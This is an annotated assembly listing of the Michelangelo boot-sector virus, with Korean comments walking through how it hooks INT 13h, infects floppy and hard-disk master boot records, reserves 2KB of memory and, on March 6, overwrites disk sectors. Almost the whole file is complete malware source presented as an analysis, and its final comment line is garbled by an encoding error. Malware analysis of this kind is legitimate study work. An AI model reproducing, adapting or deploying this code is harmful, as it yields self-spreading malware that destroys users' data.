; Michelangelo 바이러스 분석
; Disassembly by Dark Angel of PHALCON/SKISM
; Analysis by LeeJaeSeung(g0pher)

; 플로피 및 하드디스크 MBR에 감염
; 주 메모리를 2KB 줄인다
; INT 13h를 후킹한다
; 3/6일에 디스크 파괴(Stoned virus)

michelangelo    segment byte public
		assume  cs:michelangelo, ds:michelangelo
		org     0                               ; 0을 기준으로 하여 가독성을 높임
		jmp     entervirus                      ; entervirus로 점프
highmemjmp      db      0F5h, 00h, 80h, 9Fh
maxhead         db      2                       ; used by damagestuff
firstsector     dw      3
oldint13h       dd      0C8000256h

int13h:
		push    ds
		push    ax
		or      dl, dl
		jnz     exitint13h              ; 기본 드라이브가 아니라면 패스
		xor     ax, ax
		mov     ds, ax
		test    byte ptr ds:[43fh], 1
		jnz     exitint13h              ; 드라이브가 작동하지 않으면 패스
		pop     ax
		pop     ds
		pushf
		call    dword ptr cs:[oldint13h] ; 원래 인터럽트 호출
		pushf
		call    infectdisk               ; infect 호출
		popf
		retf    2                        ; 추가로 2Byte를 리턴(플래그)
exitint13h:
	    pop     ax
		pop     ds
		jmp     dword ptr cs:[oldint13h] ; 원래 인터럽트로 분기

infectdisk:
		push    ax
		push    bx
		push    cx
		push    dx
		push    ds
		push    es
		push    si
		push    di
		push    cs
		pop     ds
		push    cs
		pop     es
		mov     si, 4                    ; 루프 4번 설정
readbootblock:
		mov     ax,201h
		mov     bx,200h
		movsw   cx,1
		xor     dx,dx
		pushf
		call    oldint13h               ; a 드라이브 CHS(0,0,1) ES:BX(9F80:0200)읽기
		jnc     checkinfect             ; 읽기 성공하면 checkinfect 점프
		xor     ax,ax
		pushf
		call    oldint13h
		dec     si
		jnz     readbootblock           ; 최대 4번까지 재검사
		jmp     short quitinfect        ; 그래도 안되면 quitinfect로 점프(종료)
checkinfect:
		xor     si,si
		cld
		lodsw
		cmp     ax,[bx]
		jne     infectitnow
		lodsw
		cmp     ax,[bx+2]               ; 앞 4바이트 비교를 통해 감염 여부 확인
		je      quitinfect              ; 감염 되었다면 quitinfect로 점프
infectitnow:
		mov     ax,301h
		mov     dh,1
		mov     cl,3                    ; CHS(0,1,3)
		cmp     byte ptr [bx+15h],0FDh
		je      is360Kdisk              ; 360K 플로피디스크면 is360disk 점프
		mov     cl,0Eh                  ; CHS(0,1,E)
is360Kdisk:
		mov     firstsector,cx          ; 디스크 정보 저장
		pushf
		call    oldint13h               ; 디스크에 원본 MBR 저장
		jc      quitinfect              ; 실패하면 quitinfect로 점프(종료)
		mov     si,200h+offset partitioninfo
		mov     di,offset partitioninfo
		mov     cx,21h
		cld
		rep     movsw                   ; 파티션 정보 복사(word단위)
		mov     ax,301h
		xor     bx,bx
		mov     cx,1
		xor     dx,dx
		pushf
		call    oldint13h                ; 9F80:0의 데이터를 CHS(0,0,1)에 저장
quitinfect:
		pop     di
		pop     si
		pop     es
		pop     ds
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		retn                                 ; 레지스터 모두 복원하고 리턴
entervirus:
		xor     ax,ax
		mov     ds,ax
		cli                                     ; 인터럽트 호출 금지
		mov     ss,ax
		mov     ax,7C00h
		mov     sp,ax                           ; 스택 설정
		sti                                     ; 인터럽트 호출 가능
		push    ds
		push    ax                              ; 정상 부팅을 위해 7C00:0 백업
		mov     ax,ds:[13h*4]
		mov     word ptr ds:[7C00h+offset oldint13h],ax
		mov     ax,ds:[13h*4+2]
		mov     word ptr ds:[7C00h+offset oldint13h+2],ax ; 원본 int13 주소 백업
		mov     ax,ds:[413h]
		dec     ax
		dec     ax
		mov     ds:[413h],ax                    ; 디스크 크기정보를 2KB 줄인다
		mov     cl,6
		shl     ax,cl                           ; 확보한 공간(2KB) 주소계산
		mov     es,ax
		mov     word ptr ds:[7C00h+2+offset highmemjmp],ax ; 확보한 공간 주소 백업
		mov     ax,offset int13h
		mov     ds:[13h*4],ax
		mov     ds:[13h*4+2],es                 ; 인터럽트를 후킹(아직 새 인터럽트 정보 없음)
		mov     cx,offset partitioninfo
		mov     si,7C00h
		xor     di,di
		cld
		rep     movsb                           ; MBR 코드영역을 확보한 공간에 복사
		jmp     dword ptr cs:[7C00h+offset highmemjmp] ; 복사한 곳(9F80:00F5)에서 다음명령 실행
; 확보 공간에 복사 후 여기부터 실행
		xor     ax,ax                           ; ax 초기화
		mov     es,ax                           ; es 초기화
		int     13h                             ; HDD(DX=0) 디스크 사용
		push    cs
		pop     ds
		mov     ax,201h
		mov     bx,7C00h
		mov     cx,firstsector
		cmp     cx,7                            ; 하드디스크로 부팅했는가?(= 감염됐는가?)
		jne     floppyboot                      ; 아니면 floppyboot로 점프
		mov     dx,80h
		int     13h                             ; 메모리 MBR 복구
		jmp     short exitvirus                 ; exitvirus로 점프
floppyboot:
		mov     cx,firstsector
		mov     dx,100h
		int     13h                             ; 메모리 MBR 복구
		jc      exitvirus
		push    cs
		pop     es
		mov     ax,201h
		mov     bx,200h
		mov     cx,1
		mov     dx,80h
		int     13h                             ; HDD의 정상 MBR을 확보한 공간, 바이러스 MBR 뒤에 로드
		jc      exitvirus
		xor     si,si
		cld
		lodsw
		cmp     ax,[bx]
		jne     infectharddisk
		lodsw
		cmp     ax,[bx+2]                       ; HDD MBR의 첫 4바이트 시그니처 비교(감염확인)
		jne     infectharddisk                  ; 감염되지 않았으면 infectharddisk로 점프
exitvirus:
		xor     cx,cx
		mov     ah,4
		int     1Ah
		cmp     dx,306h                         ; 오늘이 3월 6일인지 확인
		je      damagestuff                     ; 맞으면 공격. damagestuff로 점프
		retf                                    ; 아니면 0:7C00으로 리턴(정상 부팅)
damagestuff:
		xor     dx,dx
		mov     cx,1
smashanothersector:
		mov     ax,309h
		mov     si,firstsector
		cmp     si,3
		je      smashit                  ; 360K FDD(3)면 9섹터 만큼
		mov     al,0Eh
		cmp     si,0Eh
		je      smashit                  ; 그 외 FDD(0E)면 14섹터 만큼
		mov     dl,80h
		mov     maxhead,4
		mov     al,11h                   ; HDD면 17개 섹터만큼
smashit:
		mov     bx,5000h
		mov     es,bx
		int     13h                     ; 5000:5000의 데이터로 디스크 덮어쓰기
		jnc     skiponerror
		xor     ah,ah
		int     13h                     ; 실패하면 디스크 사용 선언
skiponerror:
		inc     dh
		cmp     dh,maxhead              ; FDD는 2번 HDD는 4번 반복
		jb      smashanothersector      ; 다음 헤드 공격하기
		xor     dh,dh
		inc     ch
		jmp     short smashanothersector ; 다음 실린더 공격하기
infectharddisk:
		mov     cx,7
		mov     firstsector,cx          ; 섹터 7 저장
		mov     ax,301h
		mov     dx,80h
		int     13h                     ; 하드디스크(0,0,7)에 원본 MBR 쓰기(백업)
		jc      exitvirus
		mov     si,200h+offset partitioninfo
		mov     di,offset partitioninfo
		mov     cx,21h
		rep     movsw                   ; 원본 파티션 정보를 바이러스에 복사(word 단위)
		mov     ax,301h
		xor     bx,bx
		inc     cl
		int     13h                      ; 완성된 바이러스를 MBR코드에 복사
;*              jmp     short 01E0h
		db      0EBh, 32h               ; 시스템 크래시를 발생시켜 감염 체크
; The following bytes are meaningless.
garbage         db      1,4,11h,0,80h,0,5,5,32h,1,0,0,0,0,0,53h
partitioninfo:  db      42h dup (0)		; 0���� ä������
michelangelo    ends
		end

